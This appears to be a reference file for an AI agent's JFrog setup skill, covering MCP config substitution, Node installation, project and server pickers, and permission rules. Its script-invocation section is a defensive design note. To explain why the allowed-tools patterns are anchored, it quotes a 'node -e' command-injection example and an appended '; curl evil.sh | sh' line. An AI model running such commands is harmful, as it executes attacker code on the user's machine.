   passed as arg 2), normalizes it to the JPD root, and substitutes it
   into that one `url` string.
3. Replaces in two passes — first a placeholder preceded by a scheme
   (`https://${...}`, where our own scheme would otherwise double up),
   then a bare one. Each pass recognizes all three syntaxes: `${VAR}`,
   `$VAR`, and Codex's `<VAR>`.
4. Re-serializes the whole file (`JSON.stringify(parsed, null, 2)`) and
   writes atomically (temp file + rename) so a partial write cannot
   corrupt the file. Original formatting/whitespace elsewhere in the
   file is not preserved byte-for-byte.
5. Is idempotent — subsequent runs find no placeholder and no-op.

This is the only place `/jfrog-init` writes to a harness's plugin-owned
`mcp.json` — with one further exception for Kiro CLI: ensuring a `jfrog`
entry exists in `~/.kiro/settings/mcp.json`, which no plugin ships (see
below). Everything else in Step 5 is read-only.

**Per-harness plugin-owned config file:**

| Harness      | Plugin-owned config file |
|--------------|--------------------------|
| Cursor       | `~/.cursor/plugins/cache/cursor-public/jfrog/<sha>/mcp.json` (glob → newest) |
| VS Code      | `~/.vscode/agent-plugins/github.com/jfrog/vscode-plugin/plugin/.mcp.json` |
| Claude Code  | `~/.claude/plugins/cache/<marketplace>/jfrog/<version>/.mcp.json` (glob) |
| Codex        | `$CODEX_HOME/plugins/cache/codex-plugin/jfrog/<version>/.mcp.json` (glob → newest; `$CODEX_HOME` defaults to `~/.codex`) |
| Kiro (IDE)   | `~/.kiro/powers/installed/jfrog-kiro-power/mcp.json` (stable path) |
| Kiro CLI     | `~/.kiro/settings/mcp.json` — Kiro's own global MCP config, not shipped by any plugin, so the `jfrog` entry is **created or merged in** with a placeholder url, then substituted like every other row above |

The Kiro CLI merge is additive and never destructive: the file normally
holds the user's other MCP servers, so a `jfrog` entry that already has a
url is left untouched (a placeholder in it is the substitution step's
job), other servers and the file's mode are preserved, a symlinked config
stays a symlink, and a file that isn't valid JSON is reported rather than
rewritten.

Harness detection (in priority order): `CODEX_SANDBOX` / `CLAUDECODE` /
`CURSOR_TRACE_ID` / `VSCODE_PID` / `TERM_PROGRAM`. Override with
`JFROG_INIT_HARNESS=claude|cursor|vscode|codex|kiro|kiro-cli` or a
specific file via `JFROG_INIT_MCP_CONFIG=/abs/path`. Neither Kiro target
has an auto-detect signal yet — both are reachable only via the
`JFROG_INIT_HARNESS=kiro` / `kiro-cli` overrides.

`SKILL.md`'s Step 5 already has you export `JFROG_INIT_HARNESS=kiro` /
`kiro-cli` up front when you're running as one of those two — before
the detector ever runs, so Exit 3 below isn't the trigger for it.

**What the detector verifies** (three things):

1. Plugin file exists and is non-empty at its harness-specific path.
2. Parses as valid JSON.
3. Contains a `jfrog` entry (nested under `mcpServers` on every harness
   but Codex, which has no wrapper) with a non-empty `url`.

It does NOT enforce any other `type`/`url` shape (each plugin owns its
own schema) and it does NOT probe the endpoint — a mis-configured MCP
endpoint surfaces immediately the first time the user invokes it, and
the walk's other network checks (Steps 4, 7) already prove the JPD is
reachable.

**Step 5 branches, required behavior:**

- **Exit 0 (green)** → proceed to Step 6.
- **Exit 1 (red)** or **Exit 3 (error)** → **non-blocking** — proceed
  to Step 6 as if green, but remember the cause for the Final Summary.
  Steps 6 and 7 call the JPD's REST APIs directly with `jf config`
  credentials, never through the JFrog MCP, so a broken or
  missing plugin `mcp.json` doesn't affect whether those checks are
  accurate — there's nothing to gain by stopping the walk over it.
  Tell the red causes apart from the detector's `detail` for the
  Final Summary note:
  - Plugin file missing / empty / lacks a valid `jfrog` entry. Fix:
    **reinstall or update the JFrog plugin.** If the user asks why or
    how to fix it, run:

    ```bash
    node "${CLAUDE_SKILL_DIR}/scripts/jfrog-reinstall-jfrog-plugin.mjs"; true
    ```

    and relay its per-harness remedy — it only diagnoses and prints,
    never writes to the plugin's mcp.json.
  - Plugin file has a placeholder and automatic substitution failed
    with no url set for the resolved server-id. Fix: **resolve `jf
    config`**. Reinstalling the plugin does not fix this.
  - Kiro CLI only: it could not create or update its own
    `~/.kiro/settings/mcp.json` — no plugin ships this file, so there's
    nothing to reinstall. The detail names the actual cause (e.g. the
    parent path blocked by a non-directory, or a permissions error).
    Fix: **correct the file or parent-directory permissions/path**,
    then re-run.
  - (Exit 3 only) Harness could not be detected, or plugin file is
    invalid JSON / unreadable. Show the raw detector error in the note.
    **Do not react to this by guessing a harness or trying
    `JFROG_INIT_HARNESS` values to see what resolves it.** If this is
    Kiro or Kiro CLI, the override was already exported before the
    detector's first run (top of Step 5), so it should not reach Exit
    3 for that cause at all. Otherwise this is Exit 3, non-blocking
    like every other cause above: note it and move on to Step 6 in the
    same turn, with zero visible pause — do not stop to read this file
    or any other reference doc over it.
- **Exit 2 (`ask`)** → the one outcome that still blocks: placeholder
  present, but the jf server-id is ambiguous — every step from here on
  needs a resolved server-id, so there's nothing to skip ahead to.
  **Stop and read the `server-picker` section of the `#jfrog-init-references` steering in full**, then
  re-invoke with the pick as the positional argument.

**Note on Claude Code**: today the released Claude JFrog plugin does
not include a `.mcp.json` in its shipped tree, so Step 5 goes red on
Claude Code until the plugin ships one — this no longer stops the
walk, but the Final Summary still notes it. Never fall back to
project-scope `.mcp.json`.


## node-install-prompt

# Step 1 — the Node.js install prompt

**Required behavior for Step 1's red branch, not optional background.**
When `node --version` is missing/unparseable/`< 18`, or when `npx
--version` fails (node present but npx absent — same red branch), ask
the user (see `how-to-ask-user.md` for native tool and fallback rules):

- **Question**: "Node.js `<note>`. Install it now?"
  — where `<note>` is a brief, accurate description of what the tool
  output actually showed (e.g. "isn't installed", "`v16.4.0` is too old
  (need ≥ 18)", "is installed but npx is missing").
- **Yes**: "Install Node.js now. Adds a line to your shell startup file so future terminals can find it."
- **No**: "Cancel /jfrog-init."

**Do not** mention any install method (nvm, winget), a version manager
name, or any URL — not in the question, not in an option description.
The user only needs to answer Yes or No.

On **No** (or an out-of-band "Other" answer), stop the walk and tell
the user `/jfrog-init` cannot continue without Node ≥ 18.

## On Yes: no script — run these commands directly

**Node missing entirely means no `.mjs` script can run to install it**
(same chicken-and-egg reason Step 1 has no detector script at all — see
`SKILL.md`). The install itself is a bash/PowerShell command run
directly via the Bash tool, exactly like Step 1's own `node --version`
check, with the same `; true` treatment described in
`script-invocation.md`.

First, determine the platform:

```bash
uname -s 2>/dev/null || echo Windows_NT
```

**macOS / Linux** (anything other than a Windows-shaped result) — install
a pinned `nvm` release, then install the current Node LTS. The version
below is pinned rather than resolved from `api.github.com/.../latest` —
that endpoint is unauthenticated and rate-limited to 60 requests/hour per
IP, so it routinely 403s behind a corporate NAT; when it fails silently
(redirected to `/dev/null`), the tag resolves to an empty string, the
install-script URL collapses to `nvm-sh/nvm//install.sh`, and without
`-f` that 404 body would get piped straight into `bash`. Bump
`NVM_TAG` here when nvm ships a new release:

```bash
NVM_TAG=v0.40.6 && \
curl -fsSL "https://raw.githubusercontent.com/nvm-sh/nvm/${NVM_TAG}/install.sh" | bash && \
export NVM_DIR="$HOME/.nvm" && [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" && \
nvm install --lts && node --version && npx --version
```

**Windows** — install via `winget` (ships by default on Windows 10
1709+ / Windows 11):

```powershell
winget install -e --id OpenJS.NodeJS.LTS --accept-package-agreements --accept-source-agreements
```

`winget`'s PATH update isn't visible to the current shell. On success,
tell the user to open a new terminal and re-run `/jfrog-init` — do not
try to re-verify `node --version` in the same session on Windows.

## Fallback

Any failure on macOS/Linux (no `curl`, network error, the `nvm`
install script itself failing, or the final `node --version` still not
resolving) — or `winget` missing/failing on Windows — falls back to
today's plain message: tell the user to install Node.js ≥ 18 using
whichever method they prefer, then re-run `/jfrog-init`. Do not retry
automatically and do not try a second install method.


## project-matching

# Step 6 — project name-or-key resolution algorithm

Background for Step 6 of `/jfrog-init` (`SKILL.md`). The model doesn't
perform this matching itself — `jfrog-detect-project.mjs` does — but
this explains how a typed name-or-key resolves to a canonical project
key, for debugging an unexpected ambiguous-match or no-match result.

`jfrog-detect-project.mjs` resolves the input by:

1. Enumerating accessible projects via `GET /access/api/v1/projects`
   (GetProjectsList: <https://docs.jfrog.com/projects/reference/getprojectslist>
   — `fetch` with the token from `jf config export`; the endpoint lives
   on the Access service, off the Artifactory root, so `jf rt curl`
   cannot reach it; `jf api` is a possible future refactor). Cached per
   server for a few minutes (`~/.kiro/jfrog-scripts/jfrog-init/lib/project-cache.mjs`) so
   re-invoking the detector for each user attempt in the picker doesn't
   re-hit the network every time — matching against the list is offline
   regardless.
2. Matching the input against `project_key` and `display_name`
   (`~/.kiro/jfrog-scripts/jfrog-init/lib/projects.mjs`), strictest tier first — each tier only
   runs if the previous one had zero matches:
   - Exact key (case-insensitive) wins first.
   - Exact display-name (case-insensitive) wins next.
   - Exact match after stripping every non-alphanumeric character
     (`_`, `-`, spaces, ...) from both sides wins next — so `aicatalog`
     resolves against key `ai_catalog` / name `ai catalog` without the
     separator mattering. This is a fixed internal canonicalization,
     never a pattern compiled from user input.
   - Unique case-insensitive substring across keys+names wins next.
   - Unique substring after the same separator-stripping wins last —
     catches partial input that spans a separator, e.g. `aicat`
     against `ai_catalog`.
   - If more than one project matches at whichever tier first has any
     hits, the detector exits red with `candidates` listing the tied
     keys, and the model asks the user to be more specific.
3. Once resolved to a canonical key, existence is confirmed via
   `GET /access/api/v1/projects/<key>`.

The detector emits the canonical key on green in the JSON `resolvedKey`
field so the state-file writer can use it.


## project-picker

# Step 6 — picking a project interactively

**This is not optional background reading — it's part of Step 6's
required behavior.** Read this in full before handling any Step 6
result other than a clean green on the first try (no input needed, or
the typed input needs a picker). Use the exact `AskUserQuestion`
payload shapes below; do not paraphrase or invent your own wording.

**Everything below — `unresolved`, `candidatesWithNames`,
`similarProjects`, and which bullet you land on — is reasoning for you
to follow silently, never to narrate.** The user never sees why a
particular branch was taken, only the resulting prompt (the
`AskUserQuestion` payload or the plain-text fallback line).

**Check `unresolved` before anything below.** If the JSON has
`"unresolved": "server"`, this is NOT a project ask — the server-id
itself is ambiguous (multiple jf servers configured, none marked
`isDefault`). This can happen even when re-invoking Step 6 on its own
(e.g. a later "switch project" request), not just on a fresh full
walk. Do not fall through to the project picker below; instead **stop
and read the `server-picker` section of the `#jfrog-init-references` steering in full** for the exact
`AskUserQuestion` payload, then re-invoke Step 6 with the picked
server-id as arg 1 (project input, if any, stays arg 2).

Whenever the detector needs the user to choose — no input was passed,
the typed input didn't match anything (404), or it matched more than
one project (ambiguous) — it emits `candidatesWithNames` (the full
enumerated list, `{key, displayName}`, sorted by key) alongside the
red/ask result, as long as enumeration succeeded. Use it to drive an
`AskUserQuestion` picker instead of asking the user to type a key or
name from memory. A confirmed 404 additionally carries
`similarProjects` — up to 2 "did you mean...?" near-misses of the
typed input (see `~/.kiro/jfrog-scripts/jfrog-init/lib/projects.mjs`) — which take priority
over the generic first-two when present:

- **404 with `similarProjects` present** → the typed input was close
  to one or two real projects (e.g. typed `widgets20`, JPD has
  `widgets2`/`widgets`). Call `AskUserQuestion`, naming what was typed and
  offering the suggestions plus "Other":

  ```json
  {
    "questions": [
      {
        "question": "There's no project \"<user-input>\" — did you mean one of these?",
        "header": "Project",
        "multiSelect": false,
        "options": [
          {"label": "<similarProjects[0].displayName>", "description": "Project key: <similarProjects[0].key>"},
          {"label": "<similarProjects[1].displayName>", "description": "Project key: <similarProjects[1].key>"}
        ]
      }
    ]
  }
  ```

  If `similarProjects` has only 1 entry, use it as option 1 and fill
  option 2 from the first entry of `candidatesWithNames` that isn't
  already used (`AskUserQuestion` requires 2 options minimum). If no
  such second entry exists (the JPD has exactly this one project), skip
  `AskUserQuestion` entirely and use the plain-text fallback below
  instead. On picking a suggestion → re-invoke the detector with that
  project's **key** as arg 2. On **Other** → the user types a
  different name-or-key; re-invoke with their typed value as arg 2.

- **Otherwise, if `candidatesWithNames` has 2 or more entries** — no
  input was passed, the input was ambiguous, or it was a 404 with no
  close-enough `similarProjects` — call `AskUserQuestion` with the
  **first two** entries of `candidatesWithNames` (in the order the
  detector returned them — never reordered, never chosen by matching
  the user's name, git identity, hostname, or any other signal) as the
  two options, and rely on the tool's built-in "Other" for typing a
  different project:

  ```json
  {
    "questions": [
      {
        "question": "Which project do you want to use?",
        "header": "Project",
        "multiSelect": false,
        "options": [
          {"label": "<candidatesWithNames[0].displayName>", "description": "Project key: <candidatesWithNames[0].key>"},
          {"label": "<candidatesWithNames[1].displayName>", "description": "Project key: <candidatesWithNames[1].key>"}
        ]
      }
    ]
  }
  ```

  On picking option 1 or 2 → re-invoke the detector with that
  project's **key** as arg 2. On **Other** → the user types a
  name-or-key; re-invoke the detector with their typed value as arg 2.

- **If `candidatesWithNames` has fewer than 2 entries** (enumeration
  unavailable, or the JPD genuinely has 0–1 projects) → fall back to a
  single plain-text line, no `AskUserQuestion`:

  > *Which project do you want to use?*

  Nothing before, nothing after. Do NOT append any hint about the
  accepted input format (no *"(name or key)"*, no *"you can type a key
  or name"*, no *"either the display name or key works"*).

- **If `AskUserQuestion` is not available as a tool at all** (some
  harnesses don't expose it — check `$JFROG_INIT_HARNESS`: `kiro` /
  `kiro-cli` never have it, so skip the tool call and go straight to
  the fallback instead of calling it and surfacing its error), use the
  plain-text fallback line above —
  *"Which project do you want to use?"*, nothing else — regardless of
  how many entries `candidatesWithNames` has. Never explain that the
  tool is unavailable, never mention the candidate count or that a
  picker would otherwise have been used; the user only ever sees the
  one line.
- **Never surface the full candidate list or a count** to the user in
  any case — the picker's two options (plus "Other") or the plain-text
  fallback are the entire user-facing surface.

Once the user picks or types a value, re-invoke the detector with it
as arg 2:

```bash
node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-project.mjs" "<server-id>" "<user-input>"; rc=$?; true
```

**Do NOT** `export JF_PROJECT=…`. The only state write is the one
SKILL.md's Final summary mandates (`jfrog-state-file.mjs set`), or
`jfrog-detect-all.mjs`'s own write when running the batch walk.


## project-resolution-branches

# Step 6 — resolve branches

**Required behavior for Step 6, not optional background.** Read this in
full whenever `jfrog-detect-project.mjs` returns anything other than a
clean exit 0.

**Everything below — exit codes, `unresolved`, and which bullet you
land on — is reasoning for you to follow silently, never to narrate.**
Never repeat this table's own words back to the user (e.g. "Exit 2,
no `unresolved`" or "this is an ask with no input"). The only output
the user sees is the resulting prompt itself, the raw detector error
where one is shown, or the Final Summary.

- **Exit 2 (`ask`) with `"unresolved": "server"`** → not a project ask
  — the server-id is ambiguous. Follow "Resolving `<server-id>` for
  Steps 4-7" in `SKILL.md` (prompt for a server from `candidates`), then
  re-invoke Step 6 with the picked server-id as arg 1.
- **No input passed (`ask`/`error`, no `unresolved`)** → enumeration
  (`GET /access/api/v1/projects`) runs to drive the picker, and this is
  the only remaining way Step 6 can fail to resolve a project:
  - **Exit 2 (`ask`)** → use the picker/free-form ask from
    the `project-picker` section of the `#jfrog-init-references` steering, then re-invoke with the picked
    value as arg 2. Whatever the user picks or types is then accepted
    verbatim by the Exit 0 branch below — no second round-trip through
    matching.
  - **Exit 3 (error)** → `jf` missing or credentials unavailable/
    rejected (needed to authenticate the enumeration call). Show the
    raw detector error — this is a genuine stop (no re-pick can fix bad
    credentials).
- **Input passed (resolve — no matching, no validation)** → accepted
  exactly as given, with no network call at all: no per-project
  existence/access probe (GetProject requires Platform/Project Admin,
  same as the enumeration call — a non-admin caller would just get 403
  from both and never learn whether the project is real), and no
  name-or-key matching against the enumerated list either (that also
  depended on enumeration succeeding, and could only ever flag two
  enumerated projects as ambiguous — never useful to the same
  non-admin accounts this exists for). There is no ambiguous (red)
  outcome any more; a typed input is always green.
  - **Exit 0 (green)** → the input is accepted verbatim; `resolvedKey`
    is exactly what was passed, and the detail line says
    existence/access was not verified. Proceed to Step 7
    (`jfrog-detect-catalog-runtime.mjs [server-id]`), which takes no
    project argument — the input string only needs to be kept around
    as arg 2 to `jfrog-detect-all.mjs` itself, so a re-run re-resolves
    Step 6 the same way.


## project-state-reuse

# Step 6 — state reuse across walks

**Required behavior at the start of Step 6, not optional background.**
After a successful walk, `jfrog-detect-all.mjs` writes a hint to
`~/.jfrog/setup.json` containing the resolved JFrog server ID, JPD URL,
and canonical project key (as `currentActiveProject` — no timestamp is
stored; it's a pointer to what's active now, not a usage log). On
subsequent walks, before asking the user for a project, the model MUST:

1. Read the state file for the current server ID via
   `node "${CLAUDE_SKILL_DIR}/scripts/jfrog-state-file.mjs" get-current-project <server-id>`
   — stdout is JSON `{"currentActiveProject": "...", "jpdUrl": "..."}`
   (fields omitted if there's no record for this server-id).
2. If `currentActiveProject` is present AND its `jpdUrl` matches the
   URL `jf config show --format=json` reports for this same server-id
   today — after stripping any trailing `/artifactory` or `/ui` suffix
   and trailing slash from that freshly-read URL, the same
   normalization already applied to the stored `jpdUrl` — call
   `AskUserQuestion` with this exact payload shape (substituting the
   real key for `<KEY>`). A raw, un-normalized comparison will treat
   the server as "repointed" and skip the reuse prompt on every walk
   for any JPD whose config URL carries one of those suffixes:

   ```json
   {
     "questions": [
       {
         "question": "Reuse project <KEY> from your last setup?",
         "header": "Project",
         "multiSelect": false,
         "options": [
           {"label": "Yes", "description": "Use <KEY> again."},
           {"label": "No",  "description": "Pick a different project."}
         ]
       }
     ]
   }
   ```

3. On **Yes** → re-invoke the detector with `<currentActiveProject>` as
   arg 2. On **No** → fall through to the picker/free-form ask (see
   `project-picker.md`).
4. If the state file has no entry for this server (or the JPD URL
   drifted), skip the reuse prompt entirely and go straight to the
   picker/free-form ask.

The state file only stores public identifiers — never a token,
password, session, or any other secret, and never a timestamp. Whenever
Steps 1-4 pass, the Final summary's `jfrog-state-file.mjs set` (or
`jfrog-detect-all.mjs` in the batch walk) updates it atomically (temp
file + rename).


## script-invocation

# Invoking scripts: avoid the red "Error" framing

Every `node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-*.mjs"` command shown anywhere
in `SKILL.md` signals red/ask states via a non-zero exit code, by
design. When run directly, the harness renders that as a red `Error:
Exit code N` block — an expected red/ask result looking identical to a
genuine tool failure. Since this skill's own reasoning depends on the
exit code (0/1/2/3 map to green/red/ask/error), don't discard it —
just stop it from also flipping the *shell's* final status, so the
harness doesn't flag it:

```bash
node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-jf-cli.mjs"; rc=$?; true
```

**Capture `rc` — a bare `; true` is not enough for any detector.** Every
Step's branch table in `SKILL.md` is written in terms of the exit code
(`Exit 0 (green)`, `Exit 2 (ask)`, …), and `; true` on its own *discards*
that code: `true` becomes the last command, so `$?` is 0 no matter what
the detector reported, and every red/ask result silently reads as green.
`rc=$?` runs before the trailing `true`, so it records the detector's
real code while still leaving the shell's final status at 0. Read `$rc`
for the branch table and the JSON on stdout for the detail.

The only commands that may use a bare `; true` are the ones nothing
branches on by exit code — Step 1's `node --version` / `npx --version`
(read the printed version instead) and
`jfrog-reinstall-jfrog-plugin.mjs` (always exits 0).

This is a wording-level mitigation, not a full fix — the command and
its JSON preview may still be visible in the collapsed tool-call line
— but it removes the alarming error styling at no extra cost.

Step 1 has no script, but the same trick applies to its bare commands
for the same reason — `node --version` and `npx --version` both exit
non-zero if the binary is missing:

```bash
node --version; true
npx --version; true
```

## What's deliberately not pre-approved

`allowed-tools` in `SKILL.md` covers `node --version`, the six read-only
detectors named individually — `node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-catalog-runtime.mjs"`,
`jfrog-detect-jf-cli.mjs`, `jfrog-detect-jf-config.mjs`,
`jfrog-detect-jfrog-mcp.mjs`, `jfrog-detect-project.mjs`, and
`jfrog-detect-server-ping.mjs` — and `node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-re*.mjs"` (the purely diagnostic
`jfrog-reinstall-jfrog-plugin.mjs` and the two `jfrog-resolve-*.mjs`
lookups), `node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-state-file.mjs" get`/`get-current-project`/`path`
(the read-only modes only), `npx --version`, and `uname`. It does
**not** cover:

- Step 1's `nvm` install (`curl … | bash`, see `node-install-prompt.md`)
- Step 1's Windows Node install (`winget install …`, see
  `node-install-prompt.md`)
- Step 1's `jfrog-install-jf-cli.mjs` (downloads/executes a binary and
  edits shell rc files — see `jf-cli-install-prompt.md`)
- Step 3's web-login scripts (`node …/jfrog-login-*.mjs`, see
  `jf-config-auth-picker.md`)
- `jfrog-detect-all.mjs` (the "run everything at once" entry point — see
  `batch-walk.md`). This is **not** a member of the `jfrog-detect-*.mjs`
  grant despite the name: an earlier version of this grant used that exact
  wildcard and pre-approved `jfrog-detect-all.mjs` along with it, silently
  contradicting the "read-only detectors" framing above — `jfrog-detect-all.mjs`
  itself writes `~/.jfrog/setup.json` on overall green (see the Final
  summary in `SKILL.md`), the same mutation `jfrog-state-file.mjs set`
  is excluded below for. PR review caught this; the fix was to enumerate
  the six read-only detectors by exact filename instead of a wildcard,
  which also closes a path-traversal-shaped concern with the wildcard
  form (`jfrog-detect-*.mjs` has no anchor stopping `*` from matching
  path separators, unlike an exact filename).
- `jfrog-substitute-mcp-placeholders.mjs` (the one script that edits the
  plugin's `mcp.json` in place — see `mcp-plugin-config.md`). **Unlike
  every other entry in this list, this exclusion is theoretical, not
  operative**: `SKILL.md` never invokes this script as a standalone
  `node "${CLAUDE_SKILL_DIR}/scripts/jfrog-substitute-mcp-placeholders.mjs"`
  Bash command, so its absence from `allowed-tools` never actually
  gates anything. Its only real call site is the in-process import in
  `jfrog-detect-jfrog-mcp.mjs` (itself one of the six explicitly-named
  detectors above) — the harness's permission system approves Bash
  commands, not the function calls a pre-approved script makes once
  running, so the mutation executes with no prompt whenever Step 5 finds
  a placeholder. This is intentional, not an oversight: the write is
  narrowly scoped to the jfrog entry's `url` field, atomic (temp file + rename),
  and idempotent — see `mcp-plugin-config.md` for why that scope was
  judged safe to run unattended, unlike the two mutations below.
- `jfrog-state-file.mjs`'s **`set`** mode (writes `~/.jfrog/setup.json`
  with caller-supplied server-id/URL/project-key — see the Final summary
  in `SKILL.md`)
- `jfrog-add-claude-marketplace.mjs` (Step 8 — rewrites `~/.netrc` and
  calls `claude plugin marketplace add`, mutating Claude Code's own
  marketplace config — see `marketplace-setup.md`). **Unlike the other
  entries in this list, this one has no prior `AskUserQuestion` consent
  step** — the harness's own approval prompt is the only gate before it
  runs (the harness-detection check in front of it is a skip/routing
  check, not a consent prompt). Treat that as a known gap worth
  revisiting, not as already covered by the "Approval model" list at
  the top of `SKILL.md`.

Granting `Bash(curl:*)` / `Bash(bash:*)` / `Bash(winget:*)` for the
first four would pre-approve arbitrary shell execution, arbitrary
network transfer, or (via `winget install`'s own flags, e.g.
`--override`, which passes raw args straight to the underlying
installer) arbitrary extra installer arguments — a `Bash(...)` wrapper
around an interpreter, or a trailing wildcard on an installer command,
is not a scope. It would also buy nothing: `nvm`/Windows-Node-install
and web-login already sit behind their own `AskUserQuestion` consent
prompt, so the user has agreed before either runs.

`jfrog-install-jf-cli.mjs`, `jfrog-substitute-mcp-placeholders.mjs`,
`jfrog-state-file.mjs set`, and `jfrog-add-claude-marketplace.mjs` are
excluded for a related but distinct reason: they're the four scripts in
this directory that mutate something outside their own process (a
downloaded binary made executable and run, the plugin's `mcp.json`, the
setup state file, and `~/.netrc` plus Claude Code's own marketplace
config, respectively) rather than just reading state and emitting JSON.
A prior version of this grant covered every `*.mjs` in `scripts/`
indiscriminately — PR review on this same branch pointed out that
pre-approves running any of these without the model (or a
prompt-injected instruction it's following) ever hitting the
`AskUserQuestion` gates their *documented* call sites sit behind; the
grant itself enforced nothing. Naming the read-only scripts individually
and leaving these four to fall through to the harness's own approval
closes that gap — **for `jfrog-install-jf-cli.mjs` and
`jfrog-state-file.mjs set`**, both of which `SKILL.md` only ever runs as
their own standalone Bash command, behind their own `AskUserQuestion`
(see `jf-cli-install-prompt.md` and the Final summary, respectively).
`jfrog-substitute-mcp-placeholders.mjs` is the exception: as noted
above, it has no standalone Bash call site in the documented flow, so
there is no gap for this grant to close for it — its mutation runs
unattended by design, not because this list forgot it.
`jfrog-add-claude-marketplace.mjs` is a different kind of gap: it *does*
have a standalone Bash call site (Step 8 invokes it directly), but
unlike `jfrog-install-jf-cli.mjs` / `jfrog-state-file.mjs set` there is
no `AskUserQuestion` sitting in front of it — the harness's Bash prompt
is the only consent point. That asymmetry is called out, not resolved,
here; see the bullet above.

`node` is itself an interpreter, the same category being ruled out
above for `curl`/`bash`/`winget` — but unlike those, it isn't ungated by
a fixed string: every real invocation is either the literal `node
--version` (Step 1) or `node "${CLAUDE_SKILL_DIR}/scripts/<name>.mjs"`.
`${CLAUDE_SKILL_DIR}` is a harness-substituted variable, not a
wildcard: Claude Code replaces it with this skill's own absolute
directory in *both* the rendered `SKILL.md` content the model reads and
the `allowed-tools` Bash rules the harness matches against, before
either is used — so the two are guaranteed byte-for-byte identical
regardless of how deep the real install path is
(`~/.agents/skills/jfrog-init`, several directories deeper under a
Cursor plugin cache path, a `dev/dev-symlinks.sh` dev symlink, etc.),
never something the model has to resolve itself.

That guarantee is also why each pattern below anchors on a literal
`node "${CLAUDE_SKILL_DIR}` immediately, e.g. `Bash(node
"${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-*.mjs"*)`. An earlier version
of this grant anchored on a bare `node /*/skills/jfrog-init/…` glob
instead — a real command-injection gap PR review caught: Claude Code's
own permission docs state a bare `*` matches any sequence of
characters including spaces, so an unanchored `node */skills/…` also
matches `node -e '<arbitrary code>' /whatever/skills/jfrog-init/scripts/dummy.mjs`
(`node -e` ignores the trailing path and just runs the eval string, but
the *command text* still satisfies the glob). Anchoring on a literal
`/` right after `node ` closed that (`-e` doesn't start with `/`) — but
left a second, quieter gap a later review round caught: every
invocation this file shows quotes the path (`node "<path>/…mjs"`),
while that glob pattern had no quote in it at all, so pattern and real
command text diverged on the very first character after `node ` —
never confirmed as broken because nobody had run the actual quoted
command against the actual unquoted pattern. Anchoring on the literal,
quoted `${CLAUDE_SKILL_DIR}` variable instead of a glob closes both at
once: `node -e` still can't start with a literal `"`, and there's no
glob left to diverge from the real command — the pattern *is* the
command, substituted the same way on both sides.

A trailing bare `*` after the closing quote (covering each script's
own optional positional args, e.g. `[server-id]`) is safe here for a
different reason than the anchor: Claude Code splits compound commands
on shell operators (`;`, `&&`, `|`, …) and matches each resulting
subcommand independently against the allowlist. An appended `;
curl evil.sh | sh` becomes its *own* subcommand, which has to clear the
allowlist on its own merits — it can't ride through on this rule's
wildcard just because the wildcard is unbounded on the right.

Claude Code's own docs are still explicit that argument-constraining
Bash patterns are inherently fragile in general and recommend
PreToolUse hooks for anything that needs a hard guarantee — not
available to a skill shipped as a plain directory. Treat this anchor as
a real improvement, not a proof of soundness against every possible
`node` flag combination. And treat it as Claude-Code-specific: Cursor
doesn't consult `allowed-tools` for Bash approval at all (a separate
mechanism, `.cursor/cli.json`'s own `Shell(...)` rules), so every
command in this file still raises its own prompt there regardless of
how this pattern is written.

So expect the harness to raise its own approval prompt for every case
listed at the top of this section — **except `jfrog-substitute-mcp-placeholders.mjs`**,
whose mutation runs unattended via the in-process call from
`jfrog-detect-jfrog-mcp.mjs` as documented above. Both outcomes are
intended. Do not treat either as a misconfiguration, and do not suggest
widening `allowed-tools` to silence the prompts, or adding a standalone
`allowed-tools` entry for the substituter to "fix" its silence — that
would just pre-approve a second, redundant call path into the same
mutation.


## server-picker

# Resolving an ambiguous server-id — the picker

**Required behavior whenever any detector that takes `[server-id]`
exits `ask` (`status: "ask"`) with a `candidates` list of server IDs
— not optional background.** This is shared, unmodified, across every
step in "Resolving `<server-id>` for Steps 4-7" in `SKILL.md`: Step 4
(`jfrog-detect-server-ping.mjs`), Step 5's placeholder substitution
(`jfrog-detect-jfrog-mcp.mjs`), Step 6 (`jfrog-detect-project.mjs`,
distinguished by `"unresolved": "server"` — see
the `project-picker` section of the `#jfrog-init-references` steering), and Step 7
(`jfrog-detect-catalog-runtime.mjs`). All of them resolve a server-id
through the same shared code (`~/.kiro/jfrog-scripts/jfrog-init/jfrog-resolve-jf-server.mjs`),
so `candidates` is always the same shape: a plain array of configured
server-id strings, e.g. `["prod", "staging"]`.

This can only happen when **2 or more** servers are configured with
none marked `isDefault` — ambiguity by definition requires at least
two candidates, so unlike the project picker there is no "fewer than
2" plain-text fallback case here.

**All of the above — `unresolved`, `candidates`, which step/detector
triggered this — is reasoning for you to follow silently, never to
narrate.** The user never sees why they're being asked, only the
`AskUserQuestion` payload itself.

Ask the user (see `how-to-ask-user.md` for native tool and fallback
rules) with the **first two** entries of `candidates` (in the order
the detector returned them — never reordered, never chosen by matching
a hostname, git identity, or any other signal) as the two options, and
include a free-text escape hatch for typing a different server-id:

- **Question**: "Which JFrog server do you want to use?"
- **Option 1**: `<candidates[0]>` (description: "Server ID: `<candidates[0]>`")
- **Option 2**: `<candidates[1]>` (description: "Server ID: `<candidates[1]>`")
- **Other**: let the user type a different server-id if needed

**Never surface the full candidate list or a count** to the user in
any case — the picker's two options (plus the free-text escape hatch)
are the entire user-facing surface, same rule as the project picker.

On picking option 1 or 2, or typing a value via **Other** → re-invoke
**the same detector that emitted the ask** (never a different one)
with the picked/typed server-id as the positional argument that step
expects (see that step's own usage line in `SKILL.md`). Never invent a
server-id, never rely on `jf`'s own default-resolution fallback — the
whole point of asking is that this skill's own resolution order
(explicit arg → `JF_SERVER_ID` → `isDefault` → sole server) already
came up empty.
